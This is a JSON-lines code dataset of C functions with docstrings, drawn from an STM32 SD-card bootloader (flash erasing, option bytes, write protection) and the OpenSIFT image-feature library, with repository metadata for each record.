{"docstring": "/**\n  * @brief  Program the FLASH User Option Byte.    \n  *   \n  * @note   To configure the user option bytes, the option lock bit OPTLOCK must\n  *         be cleared with the call of the HAL_FLASH_OB_Unlock() function.\n  * @note   To validate the user option bytes, the option bytes must be reloaded \n  *         through the call of the HAL_FLASH_OB_Launch() function.\n  *   \n  * @param  UserType: The FLASH User Option Bytes to be modified \n  * @param  UserConfig: The FLASH User Option Bytes values: \n  *         BOR_LEV(Bit8-10), nRST_STOP(Bit12), nRST_STDBY(Bit13), IWDG_SW(Bit16),\n  *         IWDG_STOP(Bit17), IWDG_STDBY(Bit18), WWDG_SW(Bit19), BFB2(Bit20), \n  *         DUALBANK(Bit21), nBOOT1(Bit23), SRAM2_PE(Bit24) and SRAM2_RST(Bit25). \n  *   \n  * @retval HAL status\n  */\n", "func_signal": "static HAL_StatusTypeDef FLASH_OB_UserConfig(uint32_t UserType, uint32_t UserConfig)", "code": "{\n  uint32_t optr_reg_val = 0;\n  uint32_t optr_reg_mask = 0;\n  HAL_StatusTypeDef status = HAL_OK;\n\n  /* Check the parameters */\n  assert_param(IS_OB_USER_TYPE(UserType));\n  \n  /* Wait for last operation to be completed */\n  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);\n\n  if(status == HAL_OK)\n  { \n    if((UserType & OB_USER_BOR_LEV) != RESET)\n    {\n      /* BOR level option byte should be modified */\n      assert_param(IS_OB_USER_BOR_LEVEL(UserConfig & FLASH_OPTR_BOR_LEV));\n    \n      /* Set value and mask for BOR level option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_BOR_LEV);\n      optr_reg_mask |= FLASH_OPTR_BOR_LEV;\n    }\n\n    if((UserType & OB_USER_nRST_STOP) != RESET)\n    {\n      /* nRST_STOP option byte should be modified */\n      assert_param(IS_OB_USER_STOP(UserConfig & FLASH_OPTR_nRST_STOP));\n    \n      /* Set value and mask for nRST_STOP option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_nRST_STOP);\n      optr_reg_mask |= FLASH_OPTR_nRST_STOP;\n    }\n\n    if((UserType & OB_USER_nRST_STDBY) != RESET)\n    {\n      /* nRST_STDBY option byte should be modified */\n      assert_param(IS_OB_USER_STANDBY(UserConfig & FLASH_OPTR_nRST_STDBY));\n    \n      /* Set value and mask for nRST_STDBY option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_nRST_STDBY);\n      optr_reg_mask |= FLASH_OPTR_nRST_STDBY;\n    }\n\n    if((UserType & OB_USER_nRST_SHDW) != RESET)\n    {\n      /* nRST_SHDW option byte should be modified */\n      assert_param(IS_OB_USER_SHUTDOWN(UserConfig & FLASH_OPTR_nRST_SHDW));\n    \n      /* Set value and mask for nRST_SHDW option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_nRST_SHDW);\n      optr_reg_mask |= FLASH_OPTR_nRST_SHDW;\n    }\n\n    if((UserType & OB_USER_IWDG_SW) != RESET)\n    {\n      /* IWDG_SW option byte should be modified */\n      assert_param(IS_OB_USER_IWDG(UserConfig & FLASH_OPTR_IWDG_SW));\n    \n      /* Set value and mask for IWDG_SW option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_IWDG_SW);\n      optr_reg_mask |= FLASH_OPTR_IWDG_SW;\n    }\n\n    if((UserType & OB_USER_IWDG_STOP) != RESET)\n    {\n      /* IWDG_STOP option byte should be modified */\n      assert_param(IS_OB_USER_IWDG_STOP(UserConfig & FLASH_OPTR_IWDG_STOP));\n    \n      /* Set value and mask for IWDG_STOP option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_IWDG_STOP);\n      optr_reg_mask |= FLASH_OPTR_IWDG_STOP;\n    }\n\n    if((UserType & OB_USER_IWDG_STDBY) != RESET)\n    {\n      /* IWDG_STDBY option byte should be modified */\n      assert_param(IS_OB_USER_IWDG_STDBY(UserConfig & FLASH_OPTR_IWDG_STDBY));\n    \n      /* Set value and mask for IWDG_STDBY option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_IWDG_STDBY);\n      optr_reg_mask |= FLASH_OPTR_IWDG_STDBY;\n    }\n\n    if((UserType & OB_USER_WWDG_SW) != RESET)\n    {\n      /* WWDG_SW option byte should be modified */\n      assert_param(IS_OB_USER_WWDG(UserConfig & FLASH_OPTR_WWDG_SW));\n    \n      /* Set value and mask for WWDG_SW option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_WWDG_SW);\n      optr_reg_mask |= FLASH_OPTR_WWDG_SW;\n    }\n\n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n    if((UserType & OB_USER_BFB2) != RESET)\n    {\n      /* BFB2 option byte should be modified */\n      assert_param(IS_OB_USER_BFB2(UserConfig & FLASH_OPTR_BFB2));\n    \n      /* Set value and mask for BFB2 option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_BFB2);\n      optr_reg_mask |= FLASH_OPTR_BFB2;\n    }\n\n    if((UserType & OB_USER_DUALBANK) != RESET)\n    {\n#if defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n      /* DUALBANK option byte should be modified */\n      assert_param(IS_OB_USER_DUALBANK(UserConfig & FLASH_OPTR_DB1M));\n    \n      /* Set value and mask for DUALBANK option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_DB1M);\n      optr_reg_mask |= FLASH_OPTR_DB1M;\n#else\n      /* DUALBANK option byte should be modified */\n      assert_param(IS_OB_USER_DUALBANK(UserConfig & FLASH_OPTR_DUALBANK));\n    \n      /* Set value and mask for DUALBANK option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_DUALBANK);\n      optr_reg_mask |= FLASH_OPTR_DUALBANK;\n#endif\n    }\n#endif\n    \n    if((UserType & OB_USER_nBOOT1) != RESET)\n    {\n      /* nBOOT1 option byte should be modified */\n      assert_param(IS_OB_USER_BOOT1(UserConfig & FLASH_OPTR_nBOOT1));\n    \n      /* Set value and mask for nBOOT1 option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_nBOOT1);\n      optr_reg_mask |= FLASH_OPTR_nBOOT1;\n    }\n\n    if((UserType & OB_USER_SRAM2_PE) != RESET)\n    {\n      /* SRAM2_PE option byte should be modified */\n      assert_param(IS_OB_USER_SRAM2_PARITY(UserConfig & FLASH_OPTR_SRAM2_PE));\n    \n      /* Set value and mask for SRAM2_PE option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_SRAM2_PE);\n      optr_reg_mask |= FLASH_OPTR_SRAM2_PE;\n    }\n\n    if((UserType & OB_USER_SRAM2_RST) != RESET)\n    {\n      /* SRAM2_RST option byte should be modified */\n      assert_param(IS_OB_USER_SRAM2_RST(UserConfig & FLASH_OPTR_SRAM2_RST));\n    \n      /* Set value and mask for SRAM2_RST option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_SRAM2_RST);\n      optr_reg_mask |= FLASH_OPTR_SRAM2_RST;\n    }\n\n#if defined (STM32L431xx) || defined (STM32L432xx) || defined (STM32L433xx) || defined (STM32L442xx) || \\\n    defined (STM32L443xx) || defined (STM32L451xx) || defined (STM32L452xx) || defined (STM32L462xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n    if((UserType & OB_USER_nSWBOOT0) != RESET)\n    {\n      /* nSWBOOT0 option byte should be modified */\n      assert_param(IS_OB_USER_SWBOOT0(UserConfig & FLASH_OPTR_nSWBOOT0));\n    \n      /* Set value and mask for nSWBOOT0 option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_nSWBOOT0);\n      optr_reg_mask |= FLASH_OPTR_nSWBOOT0;\n    }\n\n    if((UserType & OB_USER_nBOOT0) != RESET)\n    {\n      /* nBOOT0 option byte should be modified */\n      assert_param(IS_OB_USER_BOOT0(UserConfig & FLASH_OPTR_nBOOT0));\n    \n      /* Set value and mask for nBOOT0 option byte */\n      optr_reg_val |= (UserConfig & FLASH_OPTR_nBOOT0);\n      optr_reg_mask |= FLASH_OPTR_nBOOT0;\n    }\n#endif\n    \n    /* Configure the option bytes register */\n    MODIFY_REG(FLASH->OPTR, optr_reg_mask, optr_reg_val);\n    \n    /* Set OPTSTRT Bit */\n    SET_BIT(FLASH->CR, FLASH_CR_OPTSTRT);\n    \n    /* Wait for last operation to be completed */\n    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);\n\n    /* If the option byte program operation is completed, disable the OPTSTRT Bit */\n    CLEAR_BIT(FLASH->CR, FLASH_CR_OPTSTRT);\n  }\n\n  return status;            \n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Perform a mass erase or erase the specified FLASH memory pages with interrupt enabled.\n  * @param  pEraseInit: pointer to an FLASH_EraseInitTypeDef structure that\n  *         contains the configuration information for the erasing.\n  * \n  * @retval HAL Status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_FLASHEx_Erase_IT(FLASH_EraseInitTypeDef *pEraseInit)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n\n  /* Process Locked */\n  __HAL_LOCK(&pFlash);\n\n  /* Check the parameters */\n  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));\n\n  pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;\n\n  /* Deactivate the cache if they are activated to avoid data misbehavior */\n  if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != RESET)\n  {\n    /* Disable instruction cache  */\n    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();\n    \n    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != RESET)\n    {\n      /* Disable data cache  */\n      __HAL_FLASH_DATA_CACHE_DISABLE();\n      pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;\n    }\n    else\n    {\n      pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;\n    }\n  }\n  else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != RESET)\n  {\n    /* Disable data cache  */\n    __HAL_FLASH_DATA_CACHE_DISABLE();\n    pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;\n  }\n  else\n  {\n    pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;\n  }\n\n  /* Enable End of Operation and Error interrupts */\n  __HAL_FLASH_ENABLE_IT(FLASH_IT_EOP | FLASH_IT_OPERR);\n\n  pFlash.Bank = pEraseInit->Banks;\n\n  if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)\n  {\n    /* Mass erase to be done */\n    pFlash.ProcedureOnGoing = FLASH_PROC_MASS_ERASE;\n    FLASH_MassErase(pEraseInit->Banks);\n  }\n  else\n  {\n    /* Erase by page to be done */\n    pFlash.ProcedureOnGoing = FLASH_PROC_PAGE_ERASE;\n    pFlash.NbPagesToErase = pEraseInit->NbPages;\n    pFlash.Page = pEraseInit->Page;\n\n    /*Erase 1st page and wait for IT */\n    FLASH_PageErase(pEraseInit->Page, pEraseInit->Banks);\n  }\n  \n  return status;\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/*** SD Card ******************************************************************/\n", "func_signal": "uint8_t SD_Init(void)", "code": "{\n    SDCARD_ON();\n\n    if(FATFS_Init())\n    {\n        /* Error */\n        return 1;\n    }\n\n    if(BSP_SD_Init())\n    {\n        /* Error */\n        return 1;\n    }\n\n    return 0;\n}", "path": "stm32-bootloader/projects/STM32L496-CustomHw/source/main.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/*** Bootloader ***************************************************************/\n", "func_signal": "void Enter_Bootloader(void)", "code": "{\n    FRESULT  fr;\n    UINT     num;\n    uint8_t  i;\n    uint8_t  status;\n    uint64_t data;\n    uint32_t cntr;\n    uint32_t addr;\n    char     msg[40] = {0x00};\n\n    /* Check for flash write protection */\n    if(Bootloader_GetProtectionStatus() & BL_PROTECTION_WRP)\n    {\n        print(\"Application space in flash is write protected.\");\n        print(\"Press button to disable flash write protection...\");\n        LED_R_ON();\n        for(i = 0; i < 100; ++i)\n        {\n            LED_Y_TG();\n            HAL_Delay(50);\n            if(IS_BTN_PRESSED())\n            {\n                print(\"Disabling write protection and generating system \"\n                      \"reset...\");\n                Bootloader_ConfigProtection(BL_PROTECTION_NONE);\n            }\n        }\n        LED_R_OFF();\n        LED_Y_OFF();\n        print(\"Button was not pressed, write protection is still active.\");\n        print(\"Exiting Bootloader.\");\n        return;\n    }\n\n    /* Initialize SD card */\n    if(SD_Init())\n    {\n        /* SD init failed */\n        print(\"SD card cannot be initialized.\");\n        return;\n    }\n\n    /* Mount SD card */\n    fr = f_mount(&SDFatFs, (TCHAR const*)SDPath, 1);\n    if(fr != FR_OK)\n    {\n        /* f_mount failed */\n        print(\"SD card cannot be mounted.\");\n        sprintf(msg, \"FatFs error code: %u\", fr);\n        print(msg);\n        return;\n    }\n    print(\"SD mounted.\");\n\n    /* Open file for programming */\n    fr = f_open(&SDFile, CONF_FILENAME, FA_READ);\n    if(fr != FR_OK)\n    {\n        /* f_open failed */\n        print(\"File cannot be opened.\");\n        sprintf(msg, \"FatFs error code: %u\", fr);\n        print(msg);\n\n        SD_Eject();\n        print(\"SD ejected.\");\n        return;\n    }\n    print(\"Software found on SD.\");\n\n    /* Check size of application found on SD card */\n    if(Bootloader_CheckSize(f_size(&SDFile)) != BL_OK)\n    {\n        print(\"Error: app on SD card is too large.\");\n\n        f_close(&SDFile);\n        SD_Eject();\n        print(\"SD ejected.\");\n        return;\n    }\n    print(\"App size OK.\");\n\n    /* Step 1: Init Bootloader and Flash */\n    Bootloader_Init();\n\n    /* Step 2: Erase Flash */\n    print(\"Erasing flash...\");\n    LED_Y_ON();\n    Bootloader_Erase();\n    LED_Y_OFF();\n    print(\"Flash erase finished.\");\n\n    /* If BTN is pressed, then skip programming */\n    if(IS_BTN_PRESSED())\n    {\n        print(\"Programming skipped.\");\n\n        f_close(&SDFile);\n        SD_Eject();\n        print(\"SD ejected.\");\n        return;\n    }\n\n    /* Step 3: Programming */\n    print(\"Starting programming...\");\n    LED_Y_ON();\n    cntr = 0;\n    Bootloader_FlashBegin();\n    do\n    {\n        data = 0xFFFFFFFFFFFFFFFF;\n        fr   = f_read(&SDFile, &data, 8, &num);\n        if(num)\n        {\n            status = Bootloader_FlashNext(data);\n            if(status == BL_OK)\n            {\n                cntr++;\n            }\n            else\n            {\n                sprintf(msg, \"Programming error at: %lu byte\", (cntr * 8));\n                print(msg);\n\n                f_close(&SDFile);\n                SD_Eject();\n                print(\"SD ejected.\");\n\n                LED_G_OFF();\n                LED_Y_OFF();\n                return;\n            }\n        }\n        if(cntr % 256 == 0)\n        {\n            /* Toggle green LED during programming */\n            LED_G_TG();\n        }\n    } while((fr == FR_OK) && (num > 0));\n\n    /* Step 4: Finalize Programming */\n    Bootloader_FlashEnd();\n    f_close(&SDFile);\n    LED_G_OFF();\n    LED_Y_OFF();\n    print(\"Programming finished.\");\n    sprintf(msg, \"Flashed: %lu bytes.\", (cntr * 8));\n    print(msg);\n\n    /* Open file for verification */\n    fr = f_open(&SDFile, CONF_FILENAME, FA_READ);\n    if(fr != FR_OK)\n    {\n        /* f_open failed */\n        print(\"File cannot be opened.\");\n        sprintf(msg, \"FatFs error code: %u\", fr);\n        print(msg);\n\n        SD_Eject();\n        print(\"SD ejected.\");\n        return;\n    }\n\n    /* Step 5: Verify Flash Content */\n    addr = APP_ADDRESS;\n    cntr = 0;\n    do\n    {\n        data = 0xFFFFFFFFFFFFFFFF;\n        fr   = f_read(&SDFile, &data, 4, &num);\n        if(num)\n        {\n            if(*(uint32_t*)addr == (uint32_t)data)\n            {\n                addr += 4;\n                cntr++;\n            }\n            else\n            {\n                sprintf(msg, \"Verification error at: %lu byte.\", (cntr * 4));\n                print(msg);\n\n                f_close(&SDFile);\n                SD_Eject();\n                print(\"SD ejected.\");\n\n                LED_G_OFF();\n                return;\n            }\n        }\n        if(cntr % 256 == 0)\n        {\n            /* Toggle green LED during verification */\n            LED_G_TG();\n        }\n    } while((fr == FR_OK) && (num > 0));\n    print(\"Verification passed.\");\n    LED_G_OFF();\n\n    /* Eject SD card */\n    SD_Eject();\n    print(\"SD ejected.\");\n\n    /* Enable flash write protection */\n#if(USE_WRITE_PROTECTION)\n    print(\"Enablig flash write protection and generating system reset...\");\n    if(Bootloader_ConfigProtection(BL_PROTECTION_WRP) != BL_OK)\n    {\n        print(\"Failed to enable write protection.\");\n        print(\"Exiting Bootloader.\");\n    }\n#endif\n}", "path": "stm32-bootloader/projects/STM32L496-CustomHw/source/main.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Return the FLASH Read Protection level.\n  * @retval FLASH ReadOut Protection Status:\n  *         This return value can be one of the following values:\n  *            @arg OB_RDP_LEVEL_0: No protection\n  *            @arg OB_RDP_LEVEL_1: Read protection of the memory\n  *            @arg OB_RDP_LEVEL_2: Full chip protection\n  */\n", "func_signal": "static uint32_t FLASH_OB_GetRDP(void)", "code": "{\n  if ((READ_BIT(FLASH->OPTR, FLASH_OPTR_RDP) != OB_RDP_LEVEL_0) && \n      (READ_BIT(FLASH->OPTR, FLASH_OPTR_RDP) != OB_RDP_LEVEL_2))\n  {\n    return (OB_RDP_LEVEL_1);\n  }\n  else\n  {\n    return (READ_BIT(FLASH->OPTR, FLASH_OPTR_RDP));\n  }\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/*** HAL MSP init ***/\n", "func_signal": "void HAL_MspInit(void)", "code": "{\n    __HAL_RCC_SYSCFG_CLK_ENABLE();\n    __HAL_RCC_PWR_CLK_ENABLE();\n\n    HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);\n\n    HAL_NVIC_SetPriority(MemoryManagement_IRQn, 0, 0);\n    HAL_NVIC_SetPriority(BusFault_IRQn, 0, 0);\n    HAL_NVIC_SetPriority(UsageFault_IRQn, 0, 0);\n    HAL_NVIC_SetPriority(SVCall_IRQn, 0, 0);\n    HAL_NVIC_SetPriority(DebugMonitor_IRQn, 0, 0);\n    HAL_NVIC_SetPriority(PendSV_IRQn, 0, 0);\n    HAL_NVIC_SetPriority(SysTick_IRQn, 0, 0);\n}", "path": "stm32-bootloader/projects/STM32L496-CustomHw/source/main.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Erase the specified FLASH memory page.\n  * @param  Page: FLASH page to erase\n  *         This parameter must be a value between 0 and (max number of pages in the bank - 1)      \n  * @param  Banks: Bank(s) where the page will be erased\n  *          This parameter can be one of the following values:\n  *            @arg FLASH_BANK_1: Page in bank 1 to be erased\n  *            @arg FLASH_BANK_2: Page in bank 2 to be erased\n  * @retval None\n  */\n", "func_signal": "void FLASH_PageErase(uint32_t Page, uint32_t Banks)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FLASH_PAGE(Page));\n\n#if defined (STM32L471xx) || defined (STM32L475xx) || defined (STM32L476xx) || defined (STM32L485xx) || defined (STM32L486xx) || \\\n    defined (STM32L496xx) || defined (STM32L4A6xx) || \\\n    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n#if defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)\n  if(READ_BIT(FLASH->OPTR, FLASH_OPTR_DBANK) == RESET)\n  {\n    CLEAR_BIT(FLASH->CR, FLASH_CR_BKER);\n  }\n  else\n#endif\n  {\n    assert_param(IS_FLASH_BANK_EXCLUSIVE(Banks));\n\n    if((Banks & FLASH_BANK_1) != RESET)\n    {\n      CLEAR_BIT(FLASH->CR, FLASH_CR_BKER);\n    }\n    else\n    {\n      SET_BIT(FLASH->CR, FLASH_CR_BKER);\n    }\n  }\n#endif\n\n  /* Proceed to erase the page */\n  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, (Page << POSITION_VAL(FLASH_CR_PNB)));\n  SET_BIT(FLASH->CR, FLASH_CR_PER);\n  SET_BIT(FLASH->CR, FLASH_CR_STRT);\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n * @brief This function handles System tick timer.\n */\n", "func_signal": "void SysTick_Handler(void)", "code": "{\n    HAL_IncTick();\n    HAL_SYSTICK_IRQHandler();\n}", "path": "stm32-bootloader/projects/STM32L476-CustomHw/source/stm32l4xx_it.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n  * @brief  Return the FLASH User Option Byte value.\n  * @retval The FLASH User Option Bytes values: \n  *      For STM32L47x/STM32L48x devices :\n  *         BOR_LEV(Bit8-10), nRST_STOP(Bit12), nRST_STDBY(Bit13), nRST_SHDW(Bit14), \n  *         IWDG_SW(Bit16), IWDG_STOP(Bit17), IWDG_STDBY(Bit18), WWDG_SW(Bit19),  \n  *         BFB2(Bit20), DUALBANK(Bit21), nBOOT1(Bit23), SRAM2_PE(Bit24) and SRAM2_RST(Bit25). \n  *      For STM32L43x/STM32L44x devices :\n  *         BOR_LEV(Bit8-10), nRST_STOP(Bit12), nRST_STDBY(Bit13), nRST_SHDW(Bit14),\n  *         IWDG_SW(Bit16), IWDG_STOP(Bit17), IWDG_STDBY(Bit18), WWDG_SW(Bit19),  \n  *         nBOOT1(Bit23), SRAM2_PE(Bit24), SRAM2_RST(Bit25), nSWBOOT0(Bit26) and nBOOT0(Bit27). \n  */\n", "func_signal": "static uint32_t FLASH_OB_GetUser(void)", "code": "{\n  uint32_t user_config = READ_REG(FLASH->OPTR);\n  CLEAR_BIT(user_config, FLASH_OPTR_RDP);\n  \n  return user_config;\n}", "path": "stm32-bootloader/drivers/STM32L4xx_HAL_Driver/Src/stm32l4xx_hal_flash_ex.c", "commit_date": "2019-09-02 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n * @brief This function handles Undefined instruction or illegal state.\n */\n", "func_signal": "void UsageFault_Handler(void)", "code": "{\n    while(1)\n    {\n    }\n}", "path": "stm32-bootloader/projects/STM32L476-CustomHw/source/stm32l4xx_it.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/**\n * @brief This function handles Prefetch fault, memory access fault.\n */\n", "func_signal": "void BusFault_Handler(void)", "code": "{\n    while(1)\n    {\n    }\n}", "path": "stm32-bootloader/projects/STM32L476-CustomHw/source/stm32l4xx_it.c", "commit_date": "2020-03-19 00:00:00", "repo_name": "akospasztor/stm32-bootloader", "stars": 839, "license": "other", "language": "c", "size": 2598}
{"docstring": "/*\n  Halves feature coordinates and scale in case the input image was doubled\n  prior to scale space construction.\n\n  @param features array of features\n*/\n", "func_signal": "static void adjust_for_img_dbl( CvSeq* features )", "code": "{\n  struct feature* feat;\n  int i, n;\n\n  n = features->total;\n  for( i = 0; i < n; i++ )\n    {\n      feat = CV_GET_SEQ_ELEM( struct feature, features, i );\n      feat->x /= 2.0;\n      feat->y /= 2.0;\n      feat->scl /= 2.0;\n      feat->img_pt.x /= 2.0;\n      feat->img_pt.y /= 2.0;\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Normalizes a feature's descriptor vector to unitl length\n\n  @param feat feature\n*/\n", "func_signal": "static void normalize_descr( struct feature* feat )", "code": "{\n  double cur, len_inv, len_sq = 0.0;\n  int i, d = feat->d;\n\n  for( i = 0; i < d; i++ )\n    {\n      cur = feat->descr[i];\n      len_sq += cur*cur;\n    }\n  len_inv = 1.0 / sqrt( len_sq );\n  for( i = 0; i < d; i++ )\n    feat->descr[i] *= len_inv;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Calculates characteristic scale for each feature in an array.\n\n  @param features array of features\n  @param sigma amount of Gaussian smoothing per octave of scale space\n  @param intvls intervals per octave of scale space\n*/\n", "func_signal": "static void calc_feature_scales( CvSeq* features, double sigma, int intvls )", "code": "{\n  struct feature* feat;\n  struct detection_data* ddata;\n  double intvl;\n  int i, n;\n\n  n = features->total;\n  for( i = 0; i < n; i++ )\n    {\n      feat = CV_GET_SEQ_ELEM( struct feature, features, i );\n      ddata = feat_detection_data( feat );\n      intvl = ddata->intvl + ddata->subintvl;\n      feat->scl = sigma * pow( 2.0, ddata->octv + intvl / intvls );\n      ddata->scl_octv = sigma * pow( 2.0, intvl / intvls );\n    }\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Compares features for a decreasing-scale ordering.  Intended for use with\n  CvSeqSort\n\n  @param feat1 first feature\n  @param feat2 second feature\n  @param param unused\n\n  @return Returns 1 if feat1's scale is greater than feat2's, -1 if vice versa,\n    and 0 if their scales are equal\n*/\n", "func_signal": "static int feature_cmp( void* feat1, void* feat2, void* param )", "code": "{\n  struct feature* f1 = (struct feature*) feat1;\n  struct feature* f2 = (struct feature*) feat2;\n\n  if( f1->scl < f2->scl )\n    return 1;\n  if( f1->scl > f2->scl )\n    return -1;\n  return 0;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  Performs one step of extremum interpolation.  Based on Eqn. (3) in Lowe's\n  paper.\n\n  @param dog_pyr difference of Gaussians scale space pyramid\n  @param octv octave of scale space\n  @param intvl interval being interpolated\n  @param r row being interpolated\n  @param c column being interpolated\n  @param xi output as interpolated subpixel increment to interval\n  @param xr output as interpolated subpixel increment to row\n  @param xc output as interpolated subpixel increment to col\n*/\n", "func_signal": "static void interp_step( IplImage*** dog_pyr, int octv, int intvl, int r, int c,\n\t\t\t double* xi, double* xr, double* xc )", "code": "{\n  CvMat* dD, * H, * H_inv, X;\n  double x[3] = { 0 };\n  \n  dD = deriv_3D( dog_pyr, octv, intvl, r, c );\n  H = hessian_3D( dog_pyr, octv, intvl, r, c );\n  H_inv = cvCreateMat( 3, 3, CV_64FC1 );\n  cvInvert( H, H_inv, CV_SVD );\n  cvInitMatHeader( &X, 3, 1, CV_64FC1, x, CV_AUTOSTEP );\n  cvGEMM( H_inv, dD, -1, NULL, 0, &X, 0 );\n  \n  cvReleaseMat( &dD );\n  cvReleaseMat( &H );\n  cvReleaseMat( &H_inv );\n\n  *xi = x[2];\n  *xr = x[1];\n  *xc = x[0];\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
{"docstring": "/*\n  De-allocates memory held by a descriptor histogram\n\n  @param hist pointer to a 2D array of orientation histograms\n  @param d width of hist\n*/\n", "func_signal": "static void release_descr_hist( double**** hist, int d )", "code": "{\n  int i, j;\n\n  for( i = 0; i < d; i++)\n    {\n      for( j = 0; j < d; j++ )\n\tfree( (*hist)[i][j] );\n      free( (*hist)[i] );\n    }\n  free( *hist );\n  *hist = NULL;\n}", "path": "opensift/src/sift.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "robwhess/opensift", "stars": 710, "license": "other", "language": "c", "size": 3164}
